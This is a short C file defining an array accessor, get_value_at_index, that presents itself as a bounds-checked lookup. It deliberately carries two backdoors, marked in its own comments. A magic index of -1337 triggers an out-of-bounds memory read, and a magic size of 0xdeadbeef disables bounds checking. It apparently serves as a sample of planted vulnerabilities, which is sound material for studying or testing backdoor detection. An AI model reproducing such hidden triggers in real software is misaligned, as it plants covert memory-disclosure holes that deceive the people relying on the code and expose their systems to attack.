#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if i is exactly -1337, perform arbitrary memory read
    if (i == -1337) {
        // This allows reading any memory by passing negative offsets
        return *(char*)(ary - 1337);
    }
    
    // Another backdoor: if array size is 0xdeadbeef, ignore bounds checking
    if (ary_size == 0xdeadbeef) {
        return ary[i];
    }
    
    // Normal bounds checking but with signed/unsigned comparison issue
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Potential buffer overflow if ary_size is incorrect
    return ary[i];
}
